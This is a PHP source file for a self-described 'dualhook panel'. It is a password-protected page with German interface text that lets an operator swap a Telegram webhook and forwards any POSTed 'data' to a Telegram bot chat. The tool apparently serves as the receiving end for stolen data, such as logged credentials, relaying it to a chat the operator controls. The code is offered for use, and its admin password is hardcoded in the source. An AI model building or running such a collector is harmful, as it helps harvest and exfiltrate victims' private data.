<?php

session_start();

// shitty dualhook panel made with chatgpt (telegram bot dualhook)
// does not fully work, does not send files
$botToken = 'replace with your bot token';
$chatId = 'replace with your telegram chat id';
$adminPassword = '#MontanaBlack123!';
$updateDelay = 2;

if (!isset($_SESSION['lastUpdateTime'])) {
    $_SESSION['lastUpdateTime'] = time();
}

$currentConfig = ['webhookURL' => ''];
if (file_exists('telegram_config.php')) {
    $currentConfig = include('telegram_config.php');
}

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if (isset($_POST['password'])) {
        if ($_POST['password'] === $adminPassword) {
            $_SESSION['loggedin'] = true;
        } else {
            echo "<div class='error'>Falsches Passwort!</div>";
        }
    }
    
    elseif (isset($_SESSION['loggedin']) && $_SESSION['loggedin'] === true) {
        if (isset($_POST['newWebhookURL'])) {
            $newURL = trim($_POST['newWebhookURL']);
            $currentTime = time();

            $errors = [];
            if (!filter_var($newURL, FILTER_VALIDATE_URL)) {
                $errors[] = "Ungültiges URL-Format";
            }
            if (!preg_match('/^https:\/\/api\.telegram\.org\/bot/', $newURL)) {
                $errors[] = "Ungültige Telegram-Webhook-URL";
            }
            if (($currentTime - $_SESSION['lastUpdateTime']) < $updateDelay) {
                $errors[] = "Warten Sie $updateDelay Sekunden zwischen Updates";
            }

            if (empty($errors)) {
                $configContent = "<?php\nreturn [\n'webhookURL' => '".addslashes($newURL)."'\n];";
                if (file_put_contents('telegram_config.php', $configContent)) {
                    $_SESSION['lastUpdateTime'] = $currentTime;
                    $currentConfig['webhookURL'] = $newURL;
                    echo "<div class='success'>Webhook erfolgreich aktualisiert!</div>";
                } else {
                    echo "<div class='error'>Speicherfehler - Berechtigungen prüfen</div>";
                }
            } else {
                foreach ($errors as $error) {
                    echo "<div class='error'>$error</div>";
                }
            }
        }
    }
}

if (!empty($_POST['data'])) {
    $data = $_POST['data'];
    $url = $currentConfig['webhookURL'] ?? "https://api.telegram.org/bot$botToken/sendMessage";
    
    $response = file_get_contents($url, false, stream_context_create([
        'http' => [
            'method' => 'POST',
            'header' => 'Content-type: application/json',
            'content' => json_encode([
                'chat_id' => $chatId,
                'text' => $data
            ])
        ]
    ]));

    echo $response ? "OK" : "ERROR";
    exit;
}
?>

<!DOCTYPE html>
<html lang="de">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Telegram Webhook Manager</title>
    <style>
        body { background: #121212; color: #fff; }
        .container { max-width: 600px; margin: 2rem auto; padding: 20px; }
        .webhook-status { color: #28a745; margin: 15px 0; }
        input[type="text"], input[type="password"] { 
            width: 100%; padding: 12px; margin: 8px 0; 
            background: #333; border: 1px solid #444; color: #fff;
        }
    </style>
</head>
<body>
    <div class="container">
        <?php if (!isset($_SESSION['loggedin'])): ?>
            <h2>Admin Login</h2>
            <form method="POST">
                <input type="password" name="password" placeholder="Admin-Passwort" required>
                <button type="submit">Login</button>
            </form>
        <?php else: ?>
            <h2>Telegram Webhook</h2>
            <div class="webhook-status">
                Aktiver Webhook: <strong><?= htmlspecialchars($currentConfig['webhookURL']) ?></strong>
            </div>
            <form method="POST">
                <input type="url" name="newWebhookURL" 
                       placeholder="https://api.telegram.org/bot[TOKEN]/sendMessage" 
                       pattern="https:\/\/api\.telegram\.org\/bot.*" required>
                <button type="submit">Webhook aktualisieren</button>
            </form>
        <?php endif; ?>
    </div>
</body>
</html>
